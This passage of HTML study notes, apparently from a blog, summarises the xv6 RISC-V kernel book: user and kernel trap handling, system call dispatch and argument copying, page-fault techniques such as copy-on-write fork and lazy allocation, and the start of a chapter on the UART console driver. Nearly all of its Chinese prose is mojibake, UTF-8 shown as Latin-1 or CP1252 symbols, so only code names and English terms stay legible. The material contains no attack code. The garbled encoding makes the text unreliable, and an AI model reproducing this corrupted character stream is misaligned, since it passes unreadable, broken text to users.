<code>usertrap</code>ï¼ˆkernel/proc.cï¼‰</p><h4 id="usertrap"><a href="#usertrap" class="headerlink" title="usertrap"></a>usertrap</h4><p><code>usertrap</code> ä»£ç ä½äº kernel/trap.c ä¸­</p><p>å®ƒçš„ä½œç”¨æ˜¯ç¡®å®š trap çš„åŸå› ï¼Œå¤„ç†å®ƒå¹¶è¿”å›</p><ol><li>é¦–å…ˆå°† stvec æ›´æ”¹ä¸º <code>kernelvec</code>ï¼ˆkernel/kenelvec.Sï¼‰ï¼Œè¿™æ ·åœ¨å†…æ ¸ä¸­å‘ç”Ÿ trap æ—¶ï¼Œä¼šè¿›å…¥ <code>kerneltrap</code> è¿›è¡Œå¤„ç†ï¼Œè€Œä¸ä¼šè¿›å…¥ <code>usertrap</code></li><li>å°† sepc ä¿å­˜åˆ° trapframe ä¸­ï¼Œå› ä¸º trap æœ‰å¯èƒ½æ—¶è®¡æ—¶å™¨ä¸­æ–­ï¼Œè½¬æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹å»æ‰§è¡Œï¼Œä¼šå°† sepc è¦†ç›–</li><li>æ ¹æ® trap ç§ç±»<ul><li>ç³»ç»Ÿè°ƒç”¨<ul><li>p-&gt;trapframe-&gt;epc +=4 è¿™æ ·åœ¨å›åˆ°ç”¨æˆ·è¿›ç¨‹æ—¶ï¼Œä¼šæ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œè€Œä¸æ˜¯å†æ‰§è¡Œ ecall</li><li>å¯ç”¨è®¾å¤‡ä¸­æ–­</li><li>è°ƒç”¨ <code>syscall</code> æ¥æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨</li></ul></li><li>è®¾å¤‡ä¸­æ–­<ul><li>è°ƒç”¨ <code>devintr</code> å¤„ç†</li></ul></li><li>å¼‚å¸¸<ul><li>æ€æ­»å‡ºé”™çš„è¿›ç¨‹</li></ul></li></ul></li><li>æ£€æŸ¥è¿›ç¨‹æ˜¯å¦è¢«æ€æ­»ï¼Œè‹¥æ€æ­»åˆ™è°ƒç”¨ <code>exit</code> é€€å‡º</li><li>æ£€æŸ¥æ˜¯å¦æ˜¯è®¡æ—¶å™¨ä¸­æ–­ï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨ <code>yield</code> æ”¾å¼ƒ CPU</li></ol><h4 id="usertrapret"><a href="#usertrapret" class="headerlink" title="usertrapret"></a>usertrapret</h4><p><code>usertrapret</code> ä»£ç ä½äº kernel/trap.c ä¸­</p><p>å®ƒçš„ä½œç”¨æ˜¯è®¾ç½® trapframe å’Œæ§åˆ¶å¯„å­˜å™¨</p><ol><li>å°† stvec æ›´æ”¹ä¸º <code>uservec</code>ï¼ˆkernel/trampoline.Sï¼‰</li><li>è®¾ç½® trapframe ä¸­ <code>uservec</code> éœ€è¦ä½¿ç”¨çš„å­—æ®µ</li><li>è®¾ç½® sstatus</li><li>è®¾ç½® sepc ä¸ºä¹‹å‰ä¿å­˜çš„ pc</li><li>å°†ç”¨æˆ·é¡µè¡¨æ”¾å…¥ a0 ä¼ é€’ç»™ <code>userret</code></li></ol><h4 id="userret"><a href="#userret" class="headerlink" title="userret"></a>userret</h4><p><code>userret</code> ä»£ç ä½äº kernel/trampoline.S ä¸­</p><p>å®ƒçš„ä½œç”¨æ˜¯åˆ‡æ¢ä¸ºç”¨æˆ·é¡µè¡¨ï¼Œä» trapframe ä¸­æ¢å¤é€šç”¨å¯„å­˜å™¨ï¼Œè°ƒç”¨ sret è·³è½¬ sepc æŒ‡å‘çš„åœ°å€ï¼Œè¿”å›åˆ°ç”¨æˆ·æ¨¡å¼</p><h3 id="ä»£ç ï¼šè°ƒç”¨ç³»ç»Ÿè°ƒç”¨"><a href="#ä»£ç ï¼šè°ƒç”¨ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ä»£ç ï¼šè°ƒç”¨ç³»ç»Ÿè°ƒç”¨"></a>ä»£ç ï¼šè°ƒç”¨ç³»ç»Ÿè°ƒç”¨</h3><p>user/initcode.S å°† exec çš„å‚æ•°æ”¾åœ¨ a0 å’Œ a1 å¯„å­˜å™¨ä¸­ï¼ŒæŠŠç³»ç»Ÿè°ƒç”¨å·æ”¾åœ¨ a7 ä¸­</p><p>ecall æŒ‡ä»¤è¿›å…¥å†…æ ¸ï¼Œæ‰§è¡Œ <code>uservec</code>ã€<code>usertrap</code> å’Œ <code>syscall</code> æ‰§è¡Œ</p><p><code>syscall</code> åœ¨ trapframe ä¸­æ£€ç´¢ a7 ä¿å­˜çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå¹¶ç”¨å®ƒç´¢å¼•åˆ° syscall ä¸­</p><p>å½“ <code>syscall</code> è¿”å›æ—¶ï¼Œå°†è¿”å›å€¼è®°å½•åˆ° p-&gt;trapframe-&gt;a0 ä¸­</p><p>ç„¶åç”¨æˆ·ç©ºé—´çš„ <code>exec</code> å‡½æ•°ä¼šå°†è¯¥å€¼è¿”å›</p><p>ç³»ç»Ÿè°ƒç”¨å·æ— æ•ˆï¼Œä¼šæ‰“å°é”™è¯¯ç„¶åè¿”å› -1</p><h3 id="ä»£ç ï¼šç³»ç»Ÿè°ƒç”¨å‚æ•°"><a href="#ä»£ç ï¼šç³»ç»Ÿè°ƒç”¨å‚æ•°" class="headerlink" title="ä»£ç ï¼šç³»ç»Ÿè°ƒç”¨å‚æ•°"></a>ä»£ç ï¼šç³»ç»Ÿè°ƒç”¨å‚æ•°</h3><p>æ ¹æ® RISC-V C è°ƒç”¨çº¦å®šï¼Œç³»ç»Ÿè°ƒç”¨å‚æ•°å­˜æ”¾åœ¨å¯„å­˜å™¨ä¸­</p><p>å†…æ ¸é™·é˜±ä»£ç å°†å¯„å­˜å™¨çš„å€¼ä¿å­˜åˆ°å½“å‰è¿›ç¨‹çš„ trapframe ä¸­ï¼Œè¿™æ ·å†…æ ¸å¯ä»¥æ‰¾åˆ°å®ƒä»¬</p><p>å†…æ ¸å‡½æ•° <code>argint</code>ï¼Œ<code>argaddr</code>ï¼Œ<code>argfd</code> ä» trapframe ä¸­æ£€ç´¢ç³»ç»Ÿè°ƒç”¨å‚æ•°ä½œä¸ºæ•´æ•°ã€æŒ‡é’ˆæˆ–æ–‡ä»¶æè¿°ç¬¦ï¼Œå®ƒä»¬éƒ½è°ƒç”¨ <code>argraw</code>  ä»ç”¨æˆ·å¯„å­˜å™¨ä¸­æ£€ç´¢</p><p>æŒ‡é’ˆä½œä¸ºå‚æ•°æœ‰ä¸¤ä¸ªæŒ‘æˆ˜</p><ul><li>ç”¨æˆ·ç¨‹åºå¯èƒ½æ˜¯é”™è¯¯æˆ–æ¶æ„çš„ï¼Œä¼ é€’ä¸€ä¸ªæ— æ•ˆçš„æŒ‡é’ˆæˆ–æ¬ºéª—å†…æ ¸ç”¨æ¥è®¿é—®å†…æ ¸å†…å­˜çš„æŒ‡é’ˆ</li><li>xv6 å†…æ ¸é¡µè¡¨æ˜ å°„ä¸ç”¨æˆ·é¡µè¡¨æ˜ å°„å¹¶ä¸ç›¸åŒï¼Œä¸èƒ½ç”¨æ™®é€šæŒ‡ä»¤ä»æä¾›çš„åœ°å€åŠ è½½æˆ–å­˜å‚¨æ•°æ®</li></ul><p>å†…æ ¸å®ç°äº†å®‰å…¨çš„ä¼ è¾“æ•°æ®çš„å‡½æ•°</p><ul><li>æ–‡ä»¶ç³»ç»Ÿè°ƒç”¨å¦‚ exec ç”¨ <code>fetchstr</code>ï¼ˆkernel/syscall.cï¼‰ä»ç”¨æˆ·ç©ºé—´æ£€ç´¢å­—ç¬¦ä¸²æ–‡ä»¶åå‚æ•°</li><li><code>fetchstr</code> è°ƒç”¨ <code>copyinstr</code>ï¼ˆkernel/vm.cï¼‰æ¥å®Œæˆ</li><li><code>copyinstr</code>  ä»ç”¨æˆ·é¡µè¡¨çš„è™šæ‹Ÿåœ°å€ p-&gt;pagetable-&gt;srcva å¤åˆ¶ max å­—èŠ‚åˆ° dst ä¸­<ul><li>å› ä¸º pagetable ä¸æ˜¯å½“å‰çš„é¡µè¡¨ï¼Œ<code>copyinstr</code> ä½¿ç”¨ walkaddrï¼ˆå®ƒä¼šè°ƒç”¨ walkï¼‰ åœ¨ pagetable ä¸­æŸ¥æ‰¾ srcvaï¼Œä»è€Œäº§ç”Ÿç‰©ç†åœ°å€ pa0</li><li>å†…æ ¸å°†æ¯ä¸ªç‰©ç†å†…å­˜åœ°å€æ˜ å°„åˆ°å¯¹åº”çš„å†…æ ¸è™šæ‹Ÿåœ°å€ï¼Œå› æ­¤ <code>copyinstr</code> èƒ½ç›´æ¥ä» pa0 å¤åˆ¶å­—ç¬¦ä¸²å­—èŠ‚åˆ° dst</li><li><code>walkaddr</code>ï¼ˆkernel/vm.cï¼‰ä¼šæ£€æŸ¥ç”¨æˆ·æä¾›çš„è™šæ‹Ÿåœ°å€æ˜¯å¦æ˜¯è¿›ç¨‹åœ°å€ç©ºé—´çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤ç¨‹åºä¸èƒ½æ¬ºéª—å†…æ ¸æ¥è¯»å–å…¶ä»–å†…å­˜</li></ul></li><li>ç±»ä¼¼çš„åŠŸèƒ½ copyout ä»å†…æ ¸è¯»å–æ•°æ®åˆ°ç”¨æˆ·æä¾›çš„åœ°å€</li></ul><h3 id="å†…æ ¸-trap"><a href="#å†…æ ¸-trap" class="headerlink" title="å†…æ ¸ trap"></a>å†…æ ¸ trap</h3><p>CPU åœ¨æ‰§è¡Œå†…æ ¸æ—¶ï¼Œstvec ä¼šæŒ‡å‘ <code>kernelvec</code>ï¼ˆkernel/kernelvec.Sï¼‰</p><p>å¦‚æœå‘ç”Ÿ trap ä¼šè·³è½¬åˆ° <code>kernelvec</code> æ¥å¤„ç† trap</p><p><code>kernelvec</code> å°†é€šç”¨å¯„å­˜å™¨ä¿å­˜åœ¨ä¸­æ–­çš„å†…æ ¸çº¿ç¨‹çš„æ ˆä¸­ï¼Œtrap æœ‰å¯èƒ½å¯¼è‡´åˆ‡æ¢çº¿ç¨‹ï¼Œè¿™æ ·ä¸ä¼šå¯¼è‡´æ··ä¹±</p><p><code>kernelvec</code> ä¿å­˜å®Œå¯„å­˜å™¨åè°ƒç”¨ <code>kerneltrap</code>ï¼ˆkernel/trap.cï¼‰</p><p><code>kerneltrap</code> ä¼šä¿å­˜æ§åˆ¶å¯„å­˜å™¨å¹¶å¤„ç†ä¸¤ç§ trap</p><ul><li>è®¾å¤‡ä¸­æ–­<ul><li>ä½¿ç”¨ <code>devintr</code> æ£€æŸ¥è®¾å¤‡ä¸­æ–­</li><li>å¦‚æœæ˜¯è®¡æ—¶å™¨ä¸­æ–­ï¼Œä¸”è¿›ç¨‹çš„å†…æ ¸çº¿ç¨‹æ­£åœ¨è¿è¡Œï¼Œ<code>kerneltrep</code> ä¼šè°ƒç”¨ <code>yield</code> è®©å…¶ä»–çº¿ç¨‹æœ‰æœºä¼šè¿è¡Œ</li></ul></li><li>å¼‚å¸¸<ul><li>å†…æ ¸ä¼šè°ƒç”¨ panic ç„¶ååœæ­¢è¿è¡Œ</li></ul></li></ul><p>å½“ <code>kerneltrap</code> ä»»åŠ¡å®Œæˆåï¼Œå®ƒéœ€è¦è¿”å›åˆ° trap ä¸­æ–­çš„ä»£ç ï¼Œä¼šæ¢å¤ä¿å­˜çš„æ§åˆ¶å¯„å­˜å™¨ï¼Œç„¶åè¿”å›åˆ° <code>kernelvec</code></p><p><code>kernelvec</code> æ¢å¤ä¿å­˜çš„é€šç”¨å¯„å­˜å™¨ï¼Œç„¶åæ‰§è¡Œ sretï¼Œè¿”å›ä¸­æ–­çš„å†…æ ¸ä»£ç </p><p>åœ¨å†…æ ¸å¼€å§‹æ‰§è¡Œæ—¶æœ‰ä¸€æ®µæ—¶é—´ stvec ä»ç„¶æŒ‡å‘ <code>uservec</code>ï¼Œè¿™æ®µæ—¶é—´å†…ä¸å…è®¸å‘ç”Ÿè®¾å¤‡ä¸­æ–­</p><p>RISC-V ä¼šåœ¨å‘ç”Ÿ trap æ—¶å…³é—­è®¾å¤‡ä¸­æ–­ï¼Œè®©å†…æ ¸æœ‰æ—¶é—´è®¾ç½® stvec ä¸º <code>kernelvec</code></p><h3 id="é¡µé¢é”™è¯¯å¼‚å¸¸"><a href="#é¡µé¢é”™è¯¯å¼‚å¸¸" class="headerlink" title="é¡µé¢é”™è¯¯å¼‚å¸¸"></a>é¡µé¢é”™è¯¯å¼‚å¸¸</h3><p>CPU ä¼šå‘å‡ºé¡µé¢é”™è¯¯å¼‚å¸¸ï¼Œå½“ï¼š</p><ul><li>è™šæ‹Ÿåœ°å€åœ¨é¡µè¡¨ä¸­æ²¡æœ‰æ˜ å°„</li><li>PTE çš„ PTE_V æ ‡å¿—ä½ä¸º 0</li><li>PTE çš„æƒé™ä½é˜»æ­¢æ­£åœ¨å°è¯•çš„æ“ä½œ</li></ul><p>RISC-V åŒºåˆ†ä¸‰ç§é¡µé¢é”™è¯¯ï¼š</p><ul><li>load page faults</li><li>store page faults</li><li>instruction page faults<ul><li>PC å¯„å­˜å™¨çš„åœ°å€æŒ‡å‘çš„æŒ‡ä»¤æ— æ³•ç¿»è¯‘</li></ul></li></ul><p>xv6 çš„å¼‚å¸¸å¤„ç†å¾ˆå•ä¸€ï¼šå¦‚æœåœ¨ç”¨æˆ·ç©ºé—´å‘ç”Ÿå¼‚å¸¸ï¼Œå†…æ ¸ä¼šæ€æ­»å‡ºé”™çš„è¿›ç¨‹ï¼Œå¦‚æœåœ¨å†…æ ¸ä¸­å‘ç”Ÿå¼‚å¸¸ï¼Œå†…æ ¸ä¼šå‘ç”Ÿ panic</p><p>çœŸå®çš„æ“ä½œç³»ç»Ÿä¼šåšå¾ˆå¤šæœ‰è¶£çš„å¤„ç†</p><ul><li>COW fork</li><li>Lazy allocation</li><li>Demand Paging</li><li>Paging to disk</li><li>Extending stacks</li><li>Memory-mapped files</li></ul><h4 id="COW-fork"><a href="#COW-fork" class="headerlink" title="COW fork"></a>COW fork</h4><p>è®¸å¤šå†…æ ¸ä½¿ç”¨é¡µé¢é”™è¯¯æ¥å®ç° COWï¼ŒåŠ å¿« forkï¼Œå®ƒä¸éœ€è¦å¤åˆ¶å†…å­˜ï¼Œç‰¹åˆ«æ˜¯åœ¨ fork å exec æ—¶å¾ˆé«˜æ•ˆ</p><p>åœ¨ xv6 ä¸­ï¼Œ<code>fork</code> ä¼šè®©å­è¿›ç¨‹çš„åˆå§‹å†…å­˜ä¸çˆ¶è¿›ç¨‹çš„ç›¸åŒï¼Œå®ƒè°ƒç”¨ <code>uvmcopy</code> ç»™å­è¿›ç¨‹åˆ†é…ç‰©ç†ç©ºé—´å¹¶å¤åˆ¶çˆ¶è¿›ç¨‹çš„å†…å­˜ç»™å®ƒ</p><p>å¦‚æœçˆ¶å­è¿›ç¨‹å…±äº«çˆ¶è¿›ç¨‹çš„ç‰©ç†å†…å­˜ä¼šæ›´åŠ é«˜æ•ˆ</p><ul><li>COW fork çš„ç®€å•è®¡åˆ’<ol><li>çˆ¶å­è¿›ç¨‹ä¸€å¼€å§‹å…±äº«æ‰€æœ‰çš„ç‰©ç†é¡µï¼Œä¸”è®¾ä¸ºåªè¯»</li><li>å½“æŸä¸ªè¿›ç¨‹è¦å†™å…¥å†…å­˜æ—¶ï¼ŒCPU æŠ›å‡ºé¡µé¢é”™è¯¯å¼‚å¸¸</li><li>å†…æ ¸çš„ trap å¤„ç†ç¨‹åºåˆ†é…ä¸€ä¸ªæ–°çš„ç‰©ç†é¡µé¢ï¼Œå¹¶å°†åŸé¡µé¢çš„å†…å®¹å¤åˆ¶è¿‡å»</li><li>å°†å‡ºé”™è¿›ç¨‹çš„é¡µè¡¨ä¸­ç›¸å…³ PTE æŒ‡å‘å‰¯æœ¬ï¼Œå…è®¸è¯»å†™ï¼Œç„¶åé‡æ–°æ‰§è¡ŒæŒ‡ä»¤</li></ol></li></ul><p>COW éœ€è¦ä¸€ä¸ªè®°å½•ï¼Œæ¥å†³å®šç‰©ç†é¡µé¢ä½•æ—¶é‡Šæ”¾ï¼Œå®ƒå¯èƒ½æœ‰å¤šä¸ªè¿›ç¨‹åœ¨ä½¿ç”¨ï¼›å½“å‘ç”Ÿ store é¡µé¢é”™è¯¯æ—¶ï¼Œå¦‚æœè¯¥ç‰©ç†é¡µé¢åªæœ‰å‡ºé”™è¿›ç¨‹æŒ‡å‘å®ƒï¼Œä¸éœ€è¦å†å¤åˆ¶ï¼Œç›´æ¥ä½¿ç”¨</p><h4 id="Lazy-allocation"><a href="#Lazy-allocation" class="headerlink" title="Lazy allocation"></a>Lazy allocation</h4><p>ç”¨æˆ·ç¨‹åºè°ƒç”¨ <code>sbrk</code> ç”³è¯·æ›´å¤šå†…å­˜æ—¶ï¼Œå†…æ ¸å…ˆå¢åŠ å®ƒçš„ sizeï¼Œä½†ä¸ç”³è¯·ç‰©ç†å†…å­˜ï¼Œä¸åˆ›å»ºæ˜ å°„</p><p>å½“ç”¨æˆ·ç¨‹åºè®¿é—®æ–°åœ°å€æ—¶ï¼Œä¼šå‘ç”Ÿé¡µé¢é”™è¯¯ï¼Œå†…æ ¸å†ç”³è¯·ä¸€é¡µç‰©ç†å†…å­˜å¹¶åœ¨é¡µè¡¨æ·»åŠ æ˜ å°„</p><ol><li>kalloc</li><li>åˆå§‹åŒ–é¡µé¢</li><li>é¡µé¢æ˜ å°„</li><li>æ›´æ–°é¡µè¡¨</li><li>é‡æ–°æ‰§è¡ŒæŒ‡ä»¤</li></ol><p>å¦‚æœç”¨æˆ·ç¨‹åºç”³è¯·äº†å¾ˆå¤§å†…å­˜ï¼Œä½†æ˜¯ä¸å»ä½¿ç”¨ï¼ŒLazy allocation ä¼šæé«˜æ•ˆç‡</p><p>lazy allocation å¯ä»¥è®©ç©ºé—´æˆæœ¬éšæ—¶é—´åˆ†æ‘Šï¼Œä½†æ˜¯ä¼šå¯¼è‡´é¡µé¢é”™è¯¯çš„é¢å¤–å¼€é”€</p><p>å†…æ ¸å¯ä»¥é€šè¿‡åˆ†é…ä¸€æ‰¹è¿ç»­é¡µé¢ï¼Œå¯¹é¡µé¢é”™è¯¯çš„ trap å¤„ç†ç¨‹åºè¿›è¡Œç‰¹æ®ŠåŒ–æ¥å‡å°å¼€é”€</p><h4 id="Demand-paging"><a href="#Demand-paging" class="headerlink" title="Demand paging"></a>Demand paging</h4><p>åœ¨ <code>exec</code> ä¸­ï¼Œxv6 ä¼šå°†ç¨‹åºçš„æ‰€æœ‰ text å’Œ data ç›´æ¥åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œç”±äºç¨‹åºå¯èƒ½ä¼šå¾ˆå¤§ï¼Œä»ç£ç›˜ä¸­è¯»å–å¼€é”€æ˜‚è´µ</p><ol><li>ç°ä»£å†…æ ¸ä¸ºç”¨æˆ·åœ°å€ç©ºé—´åˆ›å»ºé¡µè¡¨ï¼Œä½†æ˜¯ PTE æ ‡è®°ä¸ºæ— æ•ˆ</li><li>å½“å‡ºç°é¡µé¢é”™è¯¯æ—¶ï¼Œå†…æ ¸å°†é¡µé¢çš„å†…å®¹ä»ç£ç›˜ä¸­è¯»å–ï¼Œæ·»åŠ æ˜ å°„</li></ol><h4 id="Paging-to-disk"><a href="#Paging-to-disk" class="headerlink" title="Paging to disk"></a>Paging to disk</h4><p>ä¸€ä¸ªè¿›ç¨‹å¯èƒ½éœ€è¦çš„å†…å­˜å¤šäºè®¡ç®—æœºçš„ RAMï¼Œæ“ä½œç³»ç»Ÿå¯èƒ½ä¼šå®ç° paging to disk</p><p>å†…æ ¸ä¼šå°†ç”¨æˆ·é¡µé¢çš„ä¸€éƒ¨åˆ†æ”¾åœ¨å†…å­˜ä¸­ï¼Œå…¶ä½™çš„é¡µé¢ä¿å­˜åˆ°ç£ç›˜ä¸­çš„ paging area åŒºåŸŸï¼Œå¹¶å°†å¯¹åº”çš„ PTE æ ‡è®°ä¸ºæ— æ•ˆ</p><p>å½“è¿›ç¨‹å°è¯•è®¿é—®ç£ç›˜ä¸Šçš„é¡µé¢ï¼Œä¼šå‘ç”Ÿé¡µé¢é”™è¯¯ï¼Œå†…æ ¸ä¼šå°†è¯¥é¡µé¢ä»ç¡¬ç›˜ä¸­è¯»å–å‡ºæ¥</p><p><strong>å¦‚æœæ²¡æœ‰å¤šä½™çš„å†…å­˜</strong></p><p>å†…æ ¸å…ˆå°†ä¸€ä¸ªé¡µé¢é©±é€ï¼Œä¿å­˜åˆ°ç£ç›˜ä¸­ï¼Œå°†å¯¹åº”çš„ PTE æ ‡è®°ä¸ºæ— æ•ˆï¼Œä½†æ˜¯é©±é€çš„èŠ±é”€æ˜¯æ˜‚è´µçš„</p><h3 id="çœŸå®ä¸–ç•Œ-2"><a href="#çœŸå®ä¸–ç•Œ-2" class="headerlink" title="çœŸå®ä¸–ç•Œ"></a>çœŸå®ä¸–ç•Œ</h3><p>å¦‚æœå°†å†…æ ¸å†…å­˜æ˜ å°„åˆ°æ¯ä¸ªè¿›ç¨‹çš„ç”¨æˆ·é¡µè¡¨ä¸­ï¼Œå¯ä»¥æ¶ˆé™¤å¯¹é¡µè¡¨åˆ‡æ¢çš„éœ€æ±‚</p><p>ç”Ÿäº§ç¯å¢ƒçš„æ“ä½œç³»ç»Ÿå®ç°äº† COWã€Lazy allocationã€Demand pagingã€Paging to diskã€Memory-mapped files ç­‰ç­‰</p><p>xv6 æ²¡æœ‰è¿™æ ·åšï¼Œå¦‚æœç”¨å®Œå†…å­˜ï¼Œ</p><h2 id="Chapter-5-Interrupts-and-device-drivers"><a href="#Chapter-5-Interrupts-and-device-drivers" class="headerlink" title="Chapter 5 Interrupts and device drivers"></a>Chapter 5 Interrupts and device drivers</h2><ul><li><p>é©±åŠ¨ç¨‹åºï¼ˆdriverï¼‰</p><ul><li>æ“ä½œç³»ç»Ÿä¸­ç®¡ç†ç‰¹å®šè®¾å¤‡çš„ä»£ç å®ƒé…ç½®ç¡¬ä»¶ï¼Œå‘Šè¯‰è®¾å¤‡æ‰§è¡Œæ“ä½œï¼Œå¤„ç†äº§ç”Ÿçš„ä¸­æ–­ï¼Œä¸å¯èƒ½æ­£åœ¨ç­‰å¾…æ¥è‡ªè®¾å¤‡ I/O çš„è¿›ç¨‹è¿›è¡Œäº¤äº’</li><li>driver ä»£ç å¯èƒ½å¾ˆå¤æ‚ï¼Œå› ä¸ºé©±åŠ¨ç¨‹åºä¸å®ƒç®¡ç†çš„è®¾å¤‡è¦åŒæ—¶æ‰§è¡Œ</li><li>driver å¿…é¡»äº†è§£è®¾å¤‡çš„ç¡¬ä»¶æ¥å£ï¼Œæ¥å£å¯èƒ½å¾ˆå¤æ‚ä¸”ç¼ºä¹æ–‡æ¡£è®°å½•</li><li>åç»­é©±åŠ¨ç¨‹åºç”¨ driver è¡¨ç¤º<del>ï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯ driver åœ¨ä¸€å †ä¸­æ–‡é‡Œæ›´æ¸…æ™°ï¼‰</del></li></ul></li><li><p>ä¸­æ–­ï¼ˆInterruptï¼‰</p><ul><li>è®¾å¤‡éœ€è¦æ“ä½œç³»ç»Ÿç‰¹åˆ«å…³æ³¨ï¼Œå®ƒå¯ä»¥è¿›è¡Œé…ç½®ï¼Œäº§ç”Ÿä¸­æ–­ï¼ˆtrap çš„ä¸€ç§ï¼‰</li><li>å½“è®¾å¤‡å‘èµ·ä¸­æ–­ï¼Œå†…æ ¸ trap å¤„ç†ä»£ç èƒ½è¯†åˆ«å‡ºè®¾å¤‡ä¸­æ–­å¹¶è°ƒç”¨é©±åŠ¨ç¨‹åºçš„ä¸­æ–­å¤„ç†ç¨‹åº</li><li>åœ¨ xv6 ä¸­ï¼Œä¸­æ–­å¤„ç†çš„åˆ†é…åœ¨ <code>devintr</code> å‡½æ•°ä¸­</li></ul></li><li><p>è®¸å¤šè®¾å¤‡ driver åœ¨ä¸¤ä¸ªä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»£ç </p><ul><li>åœ¨è¿›ç¨‹çš„å†…æ ¸çº¿ç¨‹ä¸­æ‰§è¡Œå‰åŠéƒ¨åˆ†<ul><li>å‰åŠéƒ¨åˆ†ç”±éœ€è¦æ‰§è¡Œ I/O çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚ <code>read</code> å’Œ <code>write</code>ï¼‰æ¥è°ƒç”¨</li><li>æ­¤ä»£ç å¯èƒ½è¯·æ±‚ç¡¬ä»¶å¯åŠ¨æ“ä½œï¼ˆå¦‚è¯·æ±‚ç¡¬ç›˜è¯»å–å—ï¼‰ï¼Œç„¶åç­‰å¾…æ“ä½œå®Œæˆ</li><li>æœ€åè®¾å¤‡å®Œæˆæ“ä½œï¼Œå‘èµ·ä¸­æ–­</li></ul></li><li>åœ¨ä¸­æ–­æ—¶æ‰§è¡ŒååŠéƒ¨åˆ†<ul><li>driver çš„ä¸­æ–­å¤„ç†ç¨‹åºä½œä¸ºååŠéƒ¨åˆ†</li><li>å®ƒæ‰¾åˆ°è®¾å¤‡å®Œæˆçš„æ“ä½œï¼Œåœ¨é€‚å½“çš„æƒ…å†µå”¤é†’æ­£åœ¨ç­‰å¾…çš„è¿›ç¨‹</li><li>å‘Šè¯‰ç¡¬ä»¶å¼€å§‹å¤„ç†ä¸‹ä¸€ä¸ªæ“ä½œ</li></ul></li></ul></li></ul><h3 id="ä»£ç ï¼šæ§åˆ¶å°è¾“å…¥"><a href="#ä»£ç ï¼šæ§åˆ¶å°è¾“å…¥" class="headerlink" title="ä»£ç ï¼šæ§åˆ¶å°è¾“å…¥"></a>ä»£ç ï¼šæ§åˆ¶å°è¾“å…¥</h3><h4 id="æ§åˆ¶å°è¿æ¥åˆ°-RISC-V"><a href="#æ§åˆ¶å°è¿æ¥åˆ°-RISC-V" class="headerlink" title="æ§åˆ¶å°è¿æ¥åˆ° RISC-V"></a>æ§åˆ¶å°è¿æ¥åˆ° RISC-V</h4><p>æ§åˆ¶å° driver ä½äº kernel/console.cï¼Œå¯ä½œä¸ºé©±åŠ¨ç¨‹åºç»“æ„çš„ä¸€ä¸ªç®€å•è¯´æ˜</p><p>xv6 çš„æ§åˆ¶å° driver äº¤äº’çš„ UART ç¡¬ä»¶æ˜¯ QEMU ä»¿çœŸçš„ 16550 èŠ¯ç‰‡ï¼Œåœ¨çœŸå®çš„è®¡ç®—æœºï¼Œä¸€ä¸ª 16550 èŠ¯ç‰‡ç®¡ç† RS232 ä¸²è¡Œé“¾è·¯ï¼Œè¿æ¥ç€ä¸€ä¸ªä¸­æ–­æˆ–å…¶ä»–è®¡ç®—æœºã€‚å½“è¿è¡Œ QEMU æ—¶ï¼Œå®ƒè¿æ¥ç€é”®ç›˜å’Œæ˜¾ç¤ºå™¨</p><p>æ§åˆ¶å° driver ä¸€æ¬¡ç´¯ç§¯ä¸€è¡Œçš„è¾“å…¥ï¼Œå¤„ç†ç‰¹æ®Šçš„è¾“å…¥å­—ç¬¦ï¼Œå¦‚é€€æ ¼ backspace å’Œ control-u</p><p>å½“ç”¨æˆ·åœ¨ QEMU ä¸­å‘ xv6 è¾“å…¥æ—¶ï¼Œå‡»é”®é€šè¿‡ QEMU æ¨¡æ‹Ÿçš„ UART ç¡¬ä»¶ä¼ é€’ç»™ xv6</p><ul><li>ä¸€äº›ç‰©ç†åœ°å€ç”± RISC-V ç¡¬ä»¶è¿æ¥åˆ° UART è®¾å¤‡<ul><li>ä»è¿™äº›ç‰©ç†åœ°å€è¯»å†™æ˜¯ä¸è®¾å¤‡ç¡¬ä»¶äº¤äº’è€Œä¸æ˜¯å†…å­˜</li><li>UART çš„å†…å­˜æ˜ å°„åœ°å€ä» 0x10000000 ï¼ˆæˆ– <code>UART0</code> kenrel/memlayout.hï¼‰å¼€å§‹</li></ul></li></ul><h4 id="æ§åˆ¶å¯„å­˜å™¨"><a href="#æ§åˆ¶å¯„å­˜å™¨" class="headerlink" title="æ§åˆ¶å¯„å­˜å™¨"></a>æ§åˆ¶å¯„å­˜å™¨</h4><p>UART ç¡¬ä»¶åœ¨è½¯ä»¶å±‚é¢ä¸ºä¸€ç»„å†…å­˜æ˜ å°„çš„æ§åˆ¶å¯„å­˜å™¨ï¼ˆè¿™é‡Œçš„å¯„å­˜å™¨å¹¶ä¸æ˜¯ CPU å¯„å­˜å™¨ï¼Œè€Œä¸”ä½äº UART ç¡¬ä»¶ä¸­çš„å¯„å­˜å™¨ï¼‰</p><ul><li>UART æ§åˆ¶å¯„å­˜å™¨å®½åº¦ä¸º 1 Byteï¼Œå®ƒä»¬åœ¨ <code>UART0</code> çš„åç§»åœ¨ kernel/uart.c ä¸­å®šä¹‰</li><li>LSR <ul><li>line status register</li><li>æ¯”ç‰¹ä½è¡¨ç¤ºè¾“å…¥çš„å­—ç¬¦æ˜¯å¦åœ¨ç­‰å¾…è½¯ä»¶è¯»å–</li></ul></li><li>RHR<ul><li>receive holding register</li><li>ä¿å­˜ç­‰å¾…è¯»å–çš„å­—ç¬¦</li><li>æ¯æ¬¡ä¸€ä¸ªå­—ç¬¦è¢«è¯»å–ï¼ŒUART ç¡¬ä»¶å°†å®ƒä»ä¸€ä¸ª FIFO çš„ç»“æ„ä¸­åˆ é™¤</li><li>å½“ FIFO ç»“æ„ä¸ºç©ºæ—¶å°† LSR çš„ ready ä½æ¸…é›¶</li></ul></li><li>THR<ul><li>transimit holding register</li><li>ä¿å­˜ç­‰å¾…ä¼ è¾“çš„å­—ç¬¦</li></ul></li></ul><p>UART ä¼ 